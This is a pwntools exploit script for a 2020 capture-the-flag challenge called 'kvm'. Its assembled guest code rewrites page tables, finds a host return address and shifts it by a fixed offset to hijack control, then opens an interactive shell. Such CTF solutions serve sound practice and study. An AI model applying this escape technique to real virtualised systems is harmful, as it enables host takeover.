# -*- coding: utf-8 -*-
# @Author: resery
# @Date:   2020-09-12 13:42:58
# @Last Modified by:   resery
# @Last Modified time: 2020-09-12 20:56:47
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack, unpack
from sys import argv

#context.log_level="debug"
context.arch = 'amd64'

if sys.argv[1]=="debug":
	sh = process("./kvm")
elif sys.argv[1]=="remote":
	sh = remote("nc kvm.zajebistyc.tf",13402)

elf = ELF("./kvm")

ru = lambda x:sh.recvuntil(x)
rv = lambda x:sh.recv(x)
ra = lambda x:sh.recvall(x)
sl = lambda x:sh.sendline(x)
sd = lambda x:sh.send(x) 
sla = lambda x,y:sh.sendlineafter(x,y)
lg = lambda x:log.success(x)

def dbg():
	gdb.attach(sh)

payload = asm(
    """
    mov qword ptr [0x1000], 0x2003
    mov qword ptr [0x2000], 0x3003
    mov qword ptr [0x3000], 0x0003
    mov qword ptr [0x0], 0x3
    mov qword ptr [0x8], 0x7003

    mov rax, 0x1000
    mov cr3, rax

    mov rcx, 0x1028
look_for_ra:
    add rcx, 8
    cmp qword ptr [rcx], 0
    je look_for_ra

    add rcx, 24
overwrite_ra:
    mov rax, qword ptr [rcx]
    add rax, 0x249e6
    mov qword ptr [rcx], rax
    hlt
    """
)
#dbg()
sd("\x68\x00\x00\x00")
sd(payload)
rv(16)

sh.interactive()
